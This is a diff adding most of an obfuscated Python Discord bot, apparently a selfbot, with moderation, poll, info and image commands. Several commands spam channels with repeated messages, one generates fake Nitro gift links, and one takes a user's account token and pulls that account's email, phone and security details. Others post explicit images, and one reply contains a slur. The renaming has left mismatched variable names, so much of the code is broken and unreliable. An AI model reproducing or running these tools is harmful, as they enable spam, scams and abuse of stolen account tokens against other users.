+  await asyncio.sleep(5)
+ elif g=='darker_grey':
+  b=discord.Colour.darker_grey()
+  await m.message.add_reaction('\u2705')
+  await asyncio.sleep(5)
+ elif g=='blurple':
+  b=discord.Colour.blurple()
+  await m.message.add_reaction('\u2705')
+  await asyncio.sleep(5)
+ elif g=='greyple':
+  b=discord.Colour.greyple()
+  await m.message.add_reaction('\u2705')
+  await asyncio.sleep(5)
+ else:
+  k=discord.Embed(title="Color not found and or supported",YB=b)
+  k.set_footer('.colors for help')
+  m=await m.channel.send(embed=k)
+  await asyncio.sleep(20)
+  await m.YN()
+@l.command(description='misc')
+@Yi.tF(Yo)
+async def Ya(m,R:discord.Member):
+ Ya=random.randint(1,300)
+ k=discord.Embed(YB=b)
+ k.add_field(name=f"{member.display_name}'s iq is",value=Ya)
+ m=await m.channel.send(embed=k)
+ await asyncio.sleep(30)
+ await m.YN()
+@Ya.error
+@Yi.tF(Yo)
+async def YM(m,i):
+ if ul(i,Yi.MissingRequiredArgument):
+  Ya=random.randint(1,300)
+  k=discord.Embed(YB=b)
+  k.add_field(name="Your iq is",value=Ya)
+  m=await m.channel.send(embed=k)
+  await asyncio.sleep(30)
+  await m.YN()
+@l.command(description='misc')
+@Yi.tF(Yo)
+async def YD(m,g:ux):
+ op=['It is certain.','It is decidedly so.','Without a doubt.','Yes, definitely.','You may rely on it.','As I see it, yes.','Most likely.','Outlook good.','Yes.','Signs point to yes.','Reply hazy, try again.','Ask again later.''Better not tell you now.','Cannot predict now.','Concentrate and ask again.','Don\'t count on it.','My reply is no.','My sources say no','Outlook not so good','Very doubtful.']
+ k=discord.Embed(title=random.choice(op),YB=b)
+ m=await m.channel.send(embed=k)
+ await asyncio.sleep(30)
+ await m.YN()
+@l.command(description='general')
+@Yi.tF(Yo)
+async def YU(m,R:discord.Member):
+ F=[]
+ w=datetime.now()
+ if R.guild_permissions.kick_members:
+  F.append("Kick")
+ if R.guild_permissions.ban_members:
+  F.append("Ban")
+ if R.guild_permissions.manage_channels:
+  F.append("Manage Channels")
+ if R.guild_permissions.manage_guild:
+  F.append("Manage server")
+ if R.guild_permissions.manage_messages:
+  F.append("Manage message")
+ if R.guild_permissions.mention_everyone:
+  F.append("Mention Everyone")
+ if R.guild_permissions.mute_members:
+  F.append("Mute members")
+ if R.guild_permissions.deafen_members:
+  F.append("Deafen Members")
+ if R.guild_permissions.administrator:
+  F.append("Administrator")
+ if R.guild_permissions.move_members:
+  F.append("Move members")
+ if R.guild_permissions.manage_emojis:
+  F.append("Manage emojis")
+ if R.guild_permissions.manage_nicknames:
+  F.append("Change nicknames")
+ H=', '.join(F)
+ T=''.join([I.mention for x,I in uW(R.roles)if x!=0])
+ k=discord.Embed(title="Info",YB=b)
+ k.set_author(name=R.display_name,url=R.avatar_url,icon_url=R.avatar_url)
+ if T:
+  k.add_field(name=f"Roles [{len(member.roles)-1}]",value=T,inline=ub)
+ if H:
+  k.add_field(name="Perms",value=H)
+ k.add_field(name="Creation Date",value=R.created_at.strftime("%A, %d %B %Y at %I:%M %p"))
+ if R.joined_at:
+  k.add_field(name="Joined at",value=R.joined_at.strftime("%A, %d %B %Y at %I:%M %p"))
+ k.set_thumbnail(url=R.avatar_url)
+ k.set_footer(text=f'{time.strftime("%A, %d %B at %I:%M %p")} | ID: {member.id}')
+ if R.activity:
+  if uy(ux(R.activity))>300:
+   k.add_field(name="Status",value=ux(R.activity)[:300]+'...')
+  else:
+   k.add_field(name="Status",value=ux(R.activity))
+ if R.is_on_mobile():
+  k.add_field(name="Device:",value='Mobile')
+ else:
+  k.add_field(name="Device:",value='PC')
+ await m.channel.send(embed=k)
+@l.command(description='general')
+@Yi.tF(Yo)
+async def tY(m,timer:ui,msg1:ux,msg2:ux):
+ await m.channel.purge(limit=1)
+ k=discord.Embed(title='POLL',description=f'{msg1} or {msg2}',YB=b)
+ k.set_footer(text=f"Locking in {timer} seconds")
+ e=await m.channel.send(embed=k)
+ x=await e.add_reaction('\U0001F1E6')
+ y=await e.add_reaction('\U0001F1E7')
+ await asyncio.sleep(timer)
+ k=discord.Embed(title='POLL ENDED',description=f'{msg1} or {msg2}',YB=b)
+ z=await e.channel.fetch_message(e.uj)
+ if z.reactions[0].count>z.reactions[1].count:
+  k.set_footer(text=f'{msg1} wins the poll with {z.reactions[0].count}')
+ elif z.reactions[0].count<z.reactions[1].count:
+  k.set_footer(text=f'{msg2} wins the poll with {z.reactions[1].count}')
+ else:
+  k.set_footer(text=f'{msg1} vs {msg2} ended in a tie!')
+ await e.clear_reactions()
+ await e.edit(embed=k)
+@l.command(description='general')
+@Yi.tF(Yo)
+async def tu(m,*,word:ux):
+ try:
+  async with aiohttp.ClientSession()as N:
+   async with N.get(f'https://www.urbandictionary.com/define.php?term={word}')as r:
+    if r:
+     s=await r.text()
+     E=BeautifulSoup(s,'html.parser')
+     y=E.find("div",attrs={"class":"meaning"})
+     c=y.text
+     if uy(c)>2000:
+      k=discord.Embed(title='Definition',description=c[:2000]+'...',YB=b)
+     else:
+      k=discord.Embed(title='Definition',description=c,YB=b)
+     m=await m.channel.send(embed=k)
+    else:
+     k=discord.Embed(YB=b)
+     k.set_author(name='Word doesn\'t exist in the urban ictionary',icon_url='https://img.icons8.com/cotton/64/000000/database-error.png',url=f'https://www.urbandictionary.com/define.php?term={word}')
+     await m.channel.send(embed=k)
+     return
+ except uK as e:
+  ut(e)
+  k=discord.Embed(title='Something went wrong',description='Either the word doesnt exist on urban dictionary or the servers are down',YB=b)
+  await m.channel.send(embed=k)
+@tu.error
+async def tx(m,i):
+ if ul(i,Yi.MissingRequiredArgument):
+  k=discord.Embed(title="urban",description=f"{get_prefix(None, None)}urban [word]\nShow urban dictionary defintion for a word",YB=b)
+  await m.channel.send(embed=k)
+@l.command(description='general')
+@Yi.tF(Yo)
+async def tQ(m):
+ k=discord.Embed(YB=b)
+ k.set_author(name="Server Info",icon_url='https://img.icons8.com/color/24/000000/info--v1.png')
+ k.add_field(name="Name",value=m.guild.name,inline=tU)
+ k.add_field(name="Roles",value=uy(m.guild.roles),inline=tU)
+ k.add_field(name="Emojis",value=uy(m.guild.emojis),inline=tU)
+ k.add_field(name="Region",value=m.guild.region,inline=tU)
+ k.add_field(name="Members",value=uy(m.guild.members),inline=tU)
+ k.add_field(name="Creation Date",value=m.guild.created_at.strftime("%A, %d %B %Y at %I:%M %p"),inline=tU)
+ k.add_field(name="Text Channels",value=uy(m.guild.text_channels),inline=tU)
+ k.add_field(name="Voice Channels",value=uy(m.guild.voice_channels),inline=tU)
+ k.add_field(name="Filesize Limit",value='{:,.0f}'.format(m.guild.filesize_limit/uf(1<<20))+"MB",inline=tU)
+ k.add_field(name="Verification level",value=ux(m.guild.verification_level),inline=tU)
+ k.add_field(name="People Boosting",value=m.guild.verification_level,inline=tU)
+ k.set_thumbnail(url=m.guild.icon_url)
+ k.set_footer(text=f"ID: {ctx.guild.id}")
+ await m.channel.send(embed=k)
+@l.command(description='general')
+@Yi.tF(Yo)
+async def tl(m,amount:ui):
+ await m.message.delete()
+ g='''
+    Vel quam elementum pulvinar etiam non. In nulla posuere sollicitudin aliquam ultrices sagittis orci a. Risus feugiat in ante metus dictum at tempor commodo ullamcorper. Et netus et malesuada fames. Ut eu sem integer vitae justo. A pellentesque sit amet porttitor eget dolor. Velit egestas dui id ornare arcu odio ut sem. Nullam eget felis eget nunc. Pellentesque habitant morbi tristique senectus et netus. Nisl nunc mi ipsum faucibus vitae aliquet nec ullamcorper sit. Ullamcorper velit sed ullamcorper morbi. Mauris rhoncus aenean vel elit. Non arcu risus quis varius. Mauris pharetra et ultrices neque ornare aenean euismod elementum nisi. Convallis convallis tellus id interdum velit laoreet.
+    Sit amet porttitor eget dolor morbi non arcu risus quis. Dictum sit amet justo donec enim. Lorem mollis aliquam ut porttitor leo. Etiam tempor orci eu lobortis elementum nibh tellus. Ut etiam sit amet nisl purus in mollis. Suspendisse in est ante in. Libero enim sed faucibus turpis in eu mi. Turpis cursus in hac habitasse. Cras sed felis eget velit aliquet sagittis id consectetur. Ipsum suspendisse ultrices gravida dictum fusce. massa tincidunt dui ut ornare lectus. Ultrices neque ornare aenean euismod elementum nisi quis eleifend. Feugiat pretium nibh ipsum consequat nisl vel pretium lectus. Risus ultricies tristique nulla aliquet enim tortor at auctor urna. Consequat id porta nibh venenatis cras sed felis eget. Cursus euismod quis viverra nibh cras pulvinar. Cras semper auctor neque vitae tempus quam. Pellentesque eu tincidunt tortor aliquam nulla facilisi cras fermentum. Libero justo laoreet sit amet cursus sit. Gravida dictum fusce ut placerat orci. Augue neque gravida in fermentum et. Lectus proin nibh nisl condimentum id venenatis. Aliquet porttitor lacus luctus accumsan tortor posuere ac. Mi bibendum neque egestas congue quisque egestas diam. Commodo nulla facilisi nullam vehicula ipsum a. Laoreet suspendisse interdum consectetur libero id faucibus. Netus et malesuada fames ac. Est sit amet facilisis magna. Lobortis scelerisque fermentum dui faucibus in ornare quam.
+    ''' 
+ for i in uk(amount):
+  await m.channel.send(g[:1999])
+@YB.error
+@Yi.tF(Yo)
+async def tV(m,i):
+ if ul(i,Yi.MissingRequiredArgument):
+  k=discord.Embed(title=f"EX: {get_prefix(None, None)}color purple",YB=b)
+  k.set_author(name='Colors\n\nteal\ndark_teal\ngreen\ndark_green\nblue\ndark_blue\npurple\ndark_purple\nmagenta\ndark_magenta\ngold\ndark_gold\norange\ndark_orange\nred\ndark_red\nlighter_grey\ndark_grey\nlight_grey\ndarker_grey\nblurple\ngreyple')
+  m=await m.channel.send(embed=k)
+  await asyncio.sleep(30)
+  await m.YN()
+@l.command(description='misc')
+@Yi.tF(Yo)
+async def tb(m):
+ def tp(stringLength=6):
+  B=string.ascii_letters+string.digits
+  return ''.join(random.choice(B)for i in uk(stringLength))
+ a=tp(16)
+ await m.channel.send(f"https://discordapp.com/gifts/{code}")
+@YU.error
+async def ti(m,i):
+ if ul(i,Yi.MissingRequiredArgument):
+  F=[]
+  w=datetime.now()
+  if m.author.guild_permissions.kick_members:
+   F.append("Kick")
+  if m.author.guild_permissions.ban_members:
+   F.append("Ban")
+  if m.author.guild_permissions.manage_channels:
+   F.append("Manage Channels")
+  if m.author.guild_permissions.manage_guild:
+   F.append("Manage server")
+  if m.author.guild_permissions.manage_messages:
+   F.append("Manage message")
+  if m.author.guild_permissions.mention_everyone:
+   F.append("Mention Everyone")
+  if m.author.guild_permissions.mute_members:
+   F.append("Mute members")
+  if m.author.guild_permissions.deafen_members:
+   F.append("Deafen members")
+  if m.author.guild_permissions.administrator:
+   F.append("Administrator")
+  if m.author.guild_permissions.move_members:
+   F.append("Move members")
+  if m.author.guild_permissions.manage_emojis:
+   F.append("Manage emojis")
+  if m.author.guild_permissions.manage_nicknames:
+   F.append("Change nicknames")
+  H=', '.join(F)
+  T=''.join([I.mention for x,I in uW(m.author.roles)if x!=0])
+  k=discord.Embed(title="Info",YB=b)
+  k.set_author(name=m.author.display_name,url=m.author.avatar_url,icon_url=m.author.avatar_url)
+  if T:
+   k.add_field(name=f"Roles [{len(ctx.author.roles)-1}]",value=T,inline=ub)
+  if H:
+   k.add_field(name="Perms",value=H)
+  k.add_field(name="Creation Date",value=m.author.created_at.strftime("%A, %d %B %Y at %I:%M %p"))
+  if m.author.joined_at:
+   k.add_field(name="Joined at",value=m.author.joined_at.strftime("%A, %d %B %Y at %I:%M %p"))
+  k.set_thumbnail(url=m.author.avatar_url)
+  k.set_footer(text=f'{time.strftime("%A, %d %B at %I:%M %p")} | ID: {ctx.author.id}')
+  if m.author.activity:
+   if uy(ux(m.author.activity))>300:
+    k.add_field(name="Status",value=ux(m.author.activity)[:300]+'...')
+   else:
+    k.add_field(name="Status",value=ux(m.author.activity))
+  if m.author.is_on_mobile():
+   k.add_field(name="Device:",value='Mobile')
+  else:
+   k.add_field(name="Device:",value='PC')
+  await m.channel.send(embed=k)
+ else:
+  ut(i)
+@l.command(description='general')
+@Yi.tF(Yo)
+async def te(m,_token):
+ await m.message.delete()
+ M={'Authorization':_token,'Content-Type':'application/json'}
+ try:
+  D=requests.get('https://canary.discordapp.com/api/v6/users/@me',headers=M)
+  D=D.json()
+  U=D['id']
+  Yt=D['locale']
+  Yu=D['avatar']
+  Yx=languages.get(Yt)
+  YQ=datetime.datetime.utcfromtimestamp(((ui(U)>>22)+1420070400000)/1000).strftime('%d-%m-%Y %H:%M:%S UTC')
+ except ur:
+  ut(f"{Fore.RED}Invalid token")
+ em=discord.Embed(description=f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`\nProfile picture: [**Click here**](https://cdn.discordapp.com/avatars/{user_id}/{avatar_id})")
+ Yl=[{'name':'Phone','value':D['phone']},{'name':'Flags','value':D['flags']},{'name':'Local language','value':D['locale']+f"{language}"},{'name':'MFA?','value':D['mfa_enabled']},{'name':'Verified?','value':D['verified']},]
+ for YV in Yl:
+  if YV['value']:
+   em.add_field(name=YV['name'],value=YV['value'],inline=ub)
+   em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
+ return await m.send(embed=em)
+@l.command(description='general')
+@Yi.tF(Yo)
+async def tk(m):
+ await m.message.delete()
+ em=discord.Embed(title=m.guild.name)
+ em.set_image(url=m.guild.icon_url)
+ await m.send(embed=em)
+@l.command(description='misc',aliases=['bitcoin'])
+@Yi.tF(Yo)
+async def tW(m):
+ await m.message.delete()
+ r=requests.get('https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD,EUR')
+ r=r.json()
+ Yb=r['USD']
+ Yp=r['EUR']
+ em=discord.Embed(description=f'USD: `{str(usd)}$`\nEUR: `{str(eur)}€`')
+ em.set_author(name='Bitcoin',icon_url='https://cdn.pixabay.com/photo/2013/12/08/12/12/bitcoin-225079_960_720.png')
+ await m.send(embed=em)
+@l.command(description='misc',aliases=['ethereum'])
+@Yi.tF(Yo)
+async def ty(m):
+ await m.message.delete()
+ r=requests.get('https://min-api.cryptocompare.com/data/price?fsym=ETH&tsyms=USD,EUR')
+ r=r.json()
+ Yb=r['USD']
+ Yp=r['EUR']
+ em=discord.Embed(description=f'USD: `{str(usd)}$`\nEUR: `{str(eur)}€`')
+ em.set_author(name='Ethereum',icon_url='https://cdn.discordapp.com/attachments/271256875205525504/374282740218200064/2000px-Ethereum_logo.png')
+ await m.send(embed=em)
+@Yi.tF(Yo)
+@l.command(description='misc')
+async def tK(m):
+ await m.message.delete()
+ r=requests.get("https://nekos.life/api/v2/img/anal")
+ D=r.json()
+ em=discord.Embed()
+ em.set_image(url=D['url'])
+ await m.send(embed=em)
+@Yi.tF(Yo)
+@l.command(description='misc')
+async def tf(m):
+ await m.message.delete()
+ r=requests.get("https://nekos.life/api/v2/img/erofeet")
+ D=r.json()
+ em=discord.Embed()
+ em.set_image(url=D['url'])
+ await m.send(embed=em)
+@Yi.tF(Yo)
+@l.command(description='misc')
+async def tr(m):
+ await m.message.delete()
+ r=requests.get("https://nekos.life/api/v2/img/feetg")
+ D=r.json()
+ em=discord.Embed()
+ em.set_image(url=D['url'])
+ await m.send(embed=em)
+@Yi.tF(Yo)
+@l.command(description='misc')
+async def tj(m):
+ await m.message.delete()
+ r=requests.get("https://nekos.life/api/v2/img/Random_hentai_gif")
+ D=r.json()
+ em=discord.Embed()
+ em.set_image(url=D['url'])
+ await m.send(embed=em)
+@Yi.tF(Yo)
+@l.command(description='misc')
+async def tC(m):
+ await m.message.delete()
+ r=requests.get("https://nekos.life/api/v2/img/boobs")
+ D=r.json()
+ em=discord.Embed()
+ em.set_image(url=D['url'])
+ await m.send(embed=em)
+@Yi.tF(Yo)
+@l.command(description='misc')
+async def tq(m):
+ await m.message.delete()
+ r=requests.get("https://nekos.life/api/v2/img/tits")
+ D=r.json()
+ em=discord.Embed()
+ em.set_image(url=D['url'])
+ await m.send(embed=em)
+@Yi.tF(Yo)
+@l.command(description='misc')
+async def tv(m):
+ await m.message.delete()
+ r=requests.get("https://nekos.life/api/v2/img/blowjob")
+ D=r.json()
+ em=discord.Embed()
+ em.set_image(url=D['url'])
+ await m.send(embed=em)
+@Yi.tF(Yo)
+@l.command(description='misc')
+async def tJ(m):
+ await m.message.delete()
+ r=requests.get("https://nekos.life/api/v2/img/les")
+ D=r.json()
+ em=discord.Embed()
+ em.set_image(url=D['url'])
+ await m.send(embed=em)
+@Yi.tF(Yo)
+@l.command(description='misc')
+async def tX(m,S:discord.Member):
+ await m.message.delete()
+ r=requests.get("https://nekos.life/api/v2/img/feed")
+ D=r.json()
+ em=discord.Embed(description=S.mention)
+ em.set_image(url=D['url'])
+ await m.send(embed=em)
+@Yi.tF(Yo)
+@l.command(description='misc')
+async def to(m,S:discord.Member):
+ await m.message.delete()
+ r=requests.get("https://nekos.life/api/v2/img/tickle")
+ D=r.json()
+ em=discord.Embed(description=S.mention)
+ em.set_image(url=D['url'])
+ await m.send(embed=em)
+@Yi.tF(Yo)
+@l.command(description='misc')
+async def tO(m,S:discord.Member):
+ await m.message.delete()
+ r=requests.get("https://nekos.life/api/v2/img/slap")
+ D=r.json()
+ em=discord.Embed(description=S.mention)
+ em.set_image(url=D['url'])
+ await m.send(embed=em)
+@Yi.tF(Yo)
+@l.command(description='misc')
+async def tG(m,S:discord.Member):
+ await m.message.delete()
+ r=requests.get("https://nekos.life/api/v2/img/hug")
+ D=r.json()
+ em=discord.Embed(description=S.mention)
+ em.set_image(url=D['url'])
+ await m.send(embed=em)
+@Yi.tF(Yo)
+@l.command(description='misc')
+async def tP(m,S:discord.Member):
+ await m.message.delete()
+ r=requests.get("https://nekos.life/api/v2/img/smug")
+ D=r.json()
+ em=discord.Embed(description=S.mention)
+ em.set_image(url=D['url'])
+ await m.send(embed=em)
+@Yi.tF(Yo)
+@l.command(description='misc')
+async def tm(m,S:discord.Member):
+ await m.message.delete()
+ r=requests.get("https://nekos.life/api/v2/img/pat")
+ D=r.json()
+ em=discord.Embed(description=S.mention)
+ em.set_image(url=D['url'])
+ await m.send(embed=em)
+@Yi.tF(Yo)
+@l.command(description='misc')
+async def tA(m,S:discord.Member):
+ await m.message.delete()
+ r=requests.get("https://nekos.life/api/v2/img/kiss")
+ D=r.json()
+ em=discord.Embed(description=S.mention)
+ em.set_image(url=D['url'])
+ await m.send(embed=em)
+def th(m):
+ return m.author.guild_permissions.mute_members
+@Yi.tF(Yo)
+@l.command(description='general')
+@Yi.has_permissions(ban_members=tU)
+async def tR(m,R:discord.Member,*,reason=up):
+ try:
+  if R==m.message.author:
+   await m.channel.send("Your can\'t ban yourself retard")
+   return
+  await R.tR(reason=reason)
+  await m.channel.send("**Banned {}**".format(R.mention))
+ except discord.Forbidden:
+  await m.channel.send("You don\'t have permission to use this command")
+@Yi.tF(Yo)
+@l.command(description='general')
+@Yi.has_permissions(kick_members=tU)
+async def tS(m,R:discord.Member,*,reason=up):
+ try:
+  if R.guild_permissions.kick_members or R.guild_permissions.ban_members:
+   await m.channel.send("You cant kick this person")
+   return
+  await R.tS(reason=reason)
+  await m.channel.send("**Kicked {}**".format(R.mention))
+ except discord.Forbidden:
+  await m.channel.send("You don\'t have permission to use this command")
+@Yi.tF(Yo)
+@l.command(description='general')
+@Yi.tF(th)
+async def tL(m,R:discord.Member,*,reason=up):
+ I=discord.utils.get(m.guild.roles,name="Muted")
+ try:
+  if I:
+   if I not in R.roles:
+    await m.channel.send(f"{member.display_name} is not muted")
+    return
+   I=discord.utils.get(m.guild.roles,name="Muted")
+   await R.remove_roles(I,reason=reason)
+   await m.channel.send("**Unmuted {}**".format(R.mention))
+  else:
+   await m.channel.send("Mute role is not created")
+ except uK as e:
+  ut(e)
+@Yi.tF(Yo)
+@l.command(description='general')
+@Yi.has_permissions(ban_members=tU)
+async def tz(m,uj:ui):
+ try:
+  S=await l.fetch_user(uj)
+  await m.guild.unban(S)
+  await m.channel.send("**Unbanned {}**".format(S.display_name))
+ except discord.Forbidden:
+  await m.channel.send("You don\'t have permission to use this command")
+@Yi.tF(Yo)
+@l.command(aliases=['mm'],description='general')
+@Yi.has_permissions(manage_channels=tU)
+async def tI(m,L:discord.VoiceChannel):
+ if m.author.voice:
+  if m.author in L.members:
+   k=discord.Embed()
+   k.set_author(name='Your already in this voice channel!',icon_url='https://img.icons8.com/fluent/48/000000/error.png')
+   await m.channel.send(embed=k)
+   return
+  for x,R in uW(m.author.voice.channel.members):
+   await R.move_to(L)
+  await m.channel.send(f"**Moved {x} members**")
+ else:
+  k=discord.Embed()
+  k.set_author(name='You have to be in a voice channel to use this command',icon_url='https://img.icons8.com/fluent/48/000000/error.png')
+  await m.channel.send(embed=k)
+@Yi.tF(Yo)
+@l.command(description='general')
+@Yi.has_permissions(manage_messages=tU)
+async def tn(m,amount:ui,word:ux=up):
+ if amount<1000:
+  def tF(m):
+   return word in m.content
+  if word:
+   await m.channel.purge(limit=amount+1,tF=tF)
+  else:
+   await m.channel.purge(limit=amount+1)
+  await m.channel.send(f"Deleted **{amount}** messages",delete_after=5)
+ else:
+  k=discord.Embed()
+  k.set_author(name="Limit: 1000",icon_url="https://img.icons8.com/officel/16/000000/restriction-shield.png")
+  await m.channel.send(embed=embed)
+@Yi.tF(Yo)
+@l.command(description='general')
+@Yi.has_permissions(ban_members=tU)
+async def tw(m,R:discord.Member):
+ k=discord.Embed(YB=b)
+ Yj=[]
+ async for YC in m.guild.audit_logs(limit=up,action=discord.AuditLogAction.ban):
+  if '{0.target}'.format(YC)==R.display_name+'#'+ux(R.discriminator):
+   Yj.append(YC)
+ if uy(Yj)!=0:
+  k.set_author(name=f"Past bans for {member.display_name}")
+  for YC in Yj:
+   k.insert_field_at(0,name=ux(YC.created_at)[:19],value=f'{entry.user} banned {entry.target}\nReason: {str(entry.reason)}'.format(YC),inline=ub)
+ else:
+  k.set_author(name=f"No past bans for {member.display_name}")
+ await m.channel.send(embed=k)
+@Yi.tF(Yo)
+@l.command(aliases=['rb'],description='general')
+@Yi.has_permissions(ban_members=tU)
+async def tH(m):
+ k=discord.Embed(YB=b)
+ tw=[]
+ async for YC in m.guild.audit_logs(limit=10,action=discord.AuditLogAction.ban):
+  tw.append(YC)
+ if uy(tw)!=0:
+  k.set_author(name=f"Recent bans")
+  for YC in tw:
+   k.insert_field_at(0,name=ux(YC.created_at.strftime("%A, %d %B at %I:%M %p")),value=f'{entry.user} banned {entry.target}\nReason: {str(entry.reason)}'.format(YC),inline=ub)
+ else:
+  k.set_author(name="No past bans")
+ await m.channel.send(embed=k)
+@tw.error
+async def tT(m,i):
+ if ul(i,Yi.MissingRequiredArgument):
+  k=discord.Embed(YB=b)
+  Yj=[]
+  async for YC in m.guild.audit_logs(limit=up,action=discord.AuditLogAction.ban):
+   if '{0.target}'.format(YC)==m.author.display_name+'#'+ux(m.author.discriminator):
+    Yj.append(YC)
+  if uy(Yj)!=0:
+   k.set_author(name=f"Past bans for {ctx.author.display_name}")
+   for YC in Yj:
+    k.insert_field_at(0,name=ux(YC.created_at)[:19],value=f'{entry.user} banned {entry.target}\nReason: {str(entry.reason)}'.format(YC),inline=ub)
+  else:
+   k.set_author(name=f"No past bans for {ctx.author.display_name}")
+  await m.channel.send(embed=k)
+@tR.error
+async def td(m,i):
+ if ul(i,Yi.BadArgument):
+  await m.channel.send('I cant find that user')
+ elif ul(i,Yi.MissingRequiredArgument):
+  k=discord.Embed(title="Ban",description=f"{get_prefix(None, None)}ban [User here]\nEx: {get_prefix(None, None)}ban @someone",YB=b)
+  await m.channel.send(embed=k)
+@tS.error
+async def tN(m,i):
+ if ul(i,Yi.BadArgument):
+  await m.channel.send('I cant find that user')
+ elif ul(i,Yi.MissingRequiredArgument):
+  k=discord.Embed(title="Kick",description=f"{get_prefix(None, None)}Kick [User here]\nEx: {get_prefix(None, None)}ban @someone",YB=b)
+  await m.channel.send(embed=k)
+@tz.error
+async def ts(m,i):
+ if ul(i,Yi.MissingRequiredArgument):
+  k=discord.Embed(title="unban",description=f"{get_prefix(None, None)}unban [User here]\nEx: {get_prefix(None, None)}unban @someone",YB=b)
+  await m.channel.send(embed=k)
+ if ul(i,Yi.BadArgument):
+  await m.channel.send('I cant find that user')
+ elif ul(i,Yi.CommandInvokeError):
+  await m.channel.send('I dont think he banned')
+@tn.error
+async def tE(m,i):
+ if ul(i,Yi.MissingRequiredArgument):
+  await m.channel.send("Specify amount")
+@tL.error
+async def tc(m,i):
+ if ul(i,Yi.MissingRequiredArgument):
+  k=discord.Embed(title="Unmute",description=f"{get_prefix(None, None)}Unmute [@someone]\nEx: {get_prefix(None, None)}Unmute @Leg ",YB=b)
+  await m.channel.send(embed=k)
+@tI.error
+async def tg(m,i):
+ if ul(i,Yi.MissingRequiredArgument):
+  k=discord.Embed(title="Example:",description=f"{get_prefix(None, None)}massmove Lounge 1\n{get_prefix(None, None)}massmove 708120128977633311\n{get_prefix(None, None)}ms Lounge 1\n{get_prefix(None, None)}ms 708120128977633311",YB=b)
+  k.set_author(name='You need to specify the channel your massmoving to!',icon_url='https://img.icons8.com/plasticine/100/000000/cancel.png')
+  await m.channel.send(embed=k)
+ elif ul(i,Yi.BadArgument):
+  k=discord.Embed(title="Example:",description=f"{get_prefix(None, None)}massmove Lounge 1\n{get_prefix(None, None)}massmove 708120128977633311\n{get_prefix(None, None)}ms Lounge 1\n{get_prefix(None, None)}ms 708120128977633311",YB=b)
+  k.set_author(name='That\'s not a voice channel',icon_url='https://img.icons8.com/plasticine/100/000000/cancel.png')
+  await m.channel.send(embed=k)
+@Yi.tF(Yo)
+@l.command(aliases=['ma'],description='general')
+@Yi.has_permissions(administrator=tU)
+async def tB(m):
+ if m.author.voice:
+  m=await m.channel.send('Muting...')
+  x=0
+  for R in m.author.voice.channel.members:
+   if R!=m.author and not R.voice.mute and not R.guild_permissions.administrator:
+    x+=1
+    await R.edit(mute=tU)
+   await m.edit(content=f"Muted {x} people")
+ else:
+  k=discord.Embed()
+  k.set_author(name='You have to be in a voice channel to use this command',icon_url='https://img.icons8.com/fluent/48/000000/error.png')
+  await m.channel.send(embed=k)
+@Yi.tF(Yo)
+@l.command(aliases=['um'],description='general')
+@Yi.has_permissions(administrator=tU)
+async def ta(m):
+ if m.author.voice:
+  m=await m.channel.send('Unmuting...')
+  x=0
+  for R in m.author.voice.channel.members:
+   if R!=m.author and R.voice.mute and not R.guild_permissions.administrator:
+    x+=1
+    await R.edit(mute=ub)
+   await m.edit(content=f"Unmuted {x} people")
+ else:
+  await m.YN()
+  k=discord.Embed()
+  k.set_author(name='You have to be in a voice channel to use this command',icon_url='https://img.icons8.com/fluent/48/000000/error.png')
+  await m.channel.send(embed=k)
+@Yi.tF(Yo)
+@l.command(aliases=['da'],description='general')
+@Yi.has_permissions(administrator=tU)
+async def tM(m):
+ if m.author.voice:
+  for R in m.author.voice.channel.members:
+   await R.move_to(up)
+ else:
+  k=discord.Embed()
+  k.set_author(name='You have to be in a voice channel to use this command',icon_url='https://img.icons8.com/fluent/48/000000/error.png')
+  await m.channel.send(embed=k)
+@Yi.tF(Yo)
+@l.command(description='chaos')
+async def tD(m,amount:ui,*,A):
+ await m.message.delete()
+ for _i in uk(amount):
+  await m.send(A)
+l.run(x,bot=ub)
